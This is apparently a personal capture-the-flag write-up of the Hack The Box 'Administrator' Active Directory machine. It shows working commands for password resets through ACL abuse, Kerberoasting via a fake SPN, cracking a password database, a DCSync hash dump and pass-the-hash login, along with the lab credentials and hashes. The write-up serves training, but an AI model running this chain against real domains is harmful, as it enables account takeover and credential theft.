---
title: "Administrator"
date: 15-03-2025
categories: [Windows, Medium]
tags: [Medium, AD, DCSync, Kerberoast, Lateral Movement]
image: https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png
---


This was a really fun box. It is also the first medium I have completed and I only needed a tiny tip to fully root it. We are given Olivia's credentials which we can use to enumerate the box. With this account we can move laterally and compromise other accounts. One of these accounts has access to the **FTP** server which contains a password database which is protected with a password. After cracking this password we get more credentials for a user that has `GenericWrite` for another user that has **DCSync** rights on the domain controller.  

![administrator_info_card](assets/images/administrator/Administrator.png)

## Enumeration

#### Nmap
Running and nmap scan on the IP shows that this is an active directory machine. Since it has port 88 open we are dealing with the domain controller since it has the TGT running on this port. The other two notable ports are **FTP** and SMB. Since we have been given the credentials of the user Olivia we can try logging in into one of these services and enumerate some files.

![admin](assets/images/administrator/Pasted image 20250310104907.png)

#### FTP

Trying to login with the given credentials gives us login failure. I also tried anonymous login but this also failed. Since we do not have any other credentials this is as far as I can go with **FTP** and I move on to the next service.

#### SMB

Unlike FTP, **SMB** does allow me to login with the given credentials of Olivia. I also take the time to enumerate the users and shares in the server with netexec before I start looking through all the files. We can see that there are 10 users registered.

![admin](assets/images/administrator/Pasted image 20250310081510.png)
![admin](assets/images/administrator/Pasted image 20250310081815.png)

We can only read three shares on the system the most promising share is the **SYSVOL** share which can sometimes contain old scripts which could contain more credentials. This was not the case and the other shares did not have any good information or interesting files.  

#### Bloodhound

Since we are dealing with an active directory environment and we have valid user credentials I use bloodhound to enumerate the system further.  I used `bloudhound-python` to enumerate the system from my Linux machine.

```
sudo bloodhound-python -u 'Olivia' -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb -c all
```

I zipped the `json` files and uploaded the data to bloodhound. I saw that my current user has the `CanPSRemote` right which allows me to connect to the DC with a Powershell instance.

```
evil-winrm -i 10.10.11.42 -u Olivia -p ichliebedich
```
I looked around the folders inside Olivia's home directory but did not see anything. Therefore I try to see what other users have a home directory in this box.

![admin](assets/images/administrator/Pasted image 20250310083554.png)

The other user in this machine is Emily. I take a look into this user using bloodhound and see something interesting. 

![admin](assets/images/administrator/Pasted image 20250310110919.png)

Emily has the `GenericWrite` value to Ethan. Which can be used to kerberoast this user's account by writing a fake **SPN**. Following this I take a look at what the user Ethan can do in this box. This user can perform a **DCSync** attack which would give us the hashes of all the users in this machine. My next steps were to figure out how to get access to the user Emily from which I could get the Administrator's hash. 

## Lateral Movement

I looked around for a bit I tried to list **kerberoatable** accounts but there were none. I looked around for credentials on the box but again did not find anything. At this point I had to get a tip to use `SharpHound` and upload the data to bloodhound. I had assumed that using `bloodhound-python` would have given me all the data from the box but I was mistaken. I should have seen that there were users missing from my data which would have suggested that I was missing some pieces of information. After running `SharpHound` I was now able to get a clearer picture on how to proceed. 

```
.\SharpHound.exe -c All --zipfilename administrator
```

Now more edges appear and I am able to see that our user Olivia has an interesting ACL over the user Michael which has the ability to change the password of the user Benjamin. Benjamin does not have any extra ACL's that would grant me access to the Emily user but it does not hurt to move laterally. 

![admin](assets/images/administrator/Pasted image 20250310112240.png)

Our user has `GenericAll` privilege to the user Michael which means we have full control over this user. I decide to change this user's password `Password123!` 

```
*Evil-WinRM* PS C:\Users\olivia\Desktop> import-module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\olivia\Desktop> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\olivia\Desktop> Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword
```

![admin](assets/images/administrator/Pasted image 20250310094602.png)

Now that we have access to this new user we can change Benjamin's password since we have the `ForceChangePassword` right to this user. I use the following command from my Linux machine to change his password.

```
net rpc password "Benjamin" "Password123!" -U administrator.htb/michael%"Password123!" -S 10.10.11.42
```
![admin](assets/images/administrator/Pasted image 20250310095027.png)

#### Revisiting FTP

We now have two more users that we can use to further enumerate the system. The first thing I did was to go back to the **FTP** server we had previously tried to login to with Olivia's credentials. This time we are able to login using Benjamin's credentials that we modified before. The only file listed in the **FTP** server is a **password database**.

![admin](assets/images/administrator/Pasted image 20250310095119.png)

#### Cracking the psafe3 file

When trying to open the database I was prompted for a password. We can try to crack this password by using john's built in function `pwsafe2john`. 

```
pwsafe2john Backup.psafe3 > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
tekieromucho     (Backu)  
```

After getting the database password I was able to open the database and read it with this [app](https://github.com/pwsafe/pwsafe). I know get the credentials of three new users. Most importantly I get Emily's credentials. To recap we have the following credentials:

```
Olivia:ichliebedich
michael:Password123!
Benjamin:Password123!
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

## Privilege Escalation

Since Emily was also a user on the box and this user also has the `PsRemote` right assigned we can login with `evil-winrm`. We already enumerated how to escalate our privileges we can clearly see the steps we can take to compromise the server with the following bloodhound graph.

![admin](assets/images/administrator/Pasted image 20250311000031.png)

#### Exploiting GenericWrite

To exploit Emily's `GenericWrite` privilege over the Ethan user we can do the following. Using `PowerView` we can create a fake **SPN** for Ethan. This service name can be anything we just need to create it. The reason for this is that now Ethan will become a kerberoastable account and we will be able to get his hash. The following command is used to write a fake **SPN**. 

```
Set-DomainObject -Identity ethan -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

I tried **kerberoasting** from the Windows machine but I kept getting authentication errors probably due to Kerberos's [double hop problem](https://0xss0rz.gitbook.io/0xss0rz/pentest/internal-pentest/kerberos-double-hop-problem). This is why I run the attack through my Linux machine. 

```
impacket-GetUserSPNs -dc-ip 10.10.11.42 administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  --------  --------------------------  --------------------------  ----------
nonexistent/BLAHBLAH  ethan            2024-10-12 22:52:14.117811  2025-03-10 17:37:12.402693             



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

The first time I run the attack I get the following error message: `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` this is because my machine and the DC are in different time zones and the clock skew is detected and stops me from doing the attack. This can be solved with a very handy tool called `ntpdate`. We can provide the DC's IP address to the tool and it will switch our time to the DC's time zone which would eliminate the clock skew. I tried running the command one by one but it seems that my time gets reset almost immediately this is why I run the commands with `;`. 

```
sudo ntpdate -u 10.10.11.42 ; impacket-GetUserSPNs -dc-ip 10.10.11.42 administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request
```
![admin](assets/images/administrator/Pasted image 20250311000833.png)

We get Ethan's hash. I used `hashcat` to crack the password and we get Ethan's credentials: 

```
ethan:limpbizkit
```


#### DCSync Attack

Since Ethan has **DCSync** rights over the DC we can perform this attack and get all the NTLM hashes from this DC, including the administrators hash. 

```
impacket-secretsdump -outputfile admin_hashes -just-dc administrator.htb/ethan@10.10.11.42
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
```

From here we can try to crack the hash but its not really necessary we can use pass the hash to login as administrator from `evil-winrm`.

```
evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

Overall this was a very fun box and I liked the concepts of lateral movement to get the password database from the FTP server. 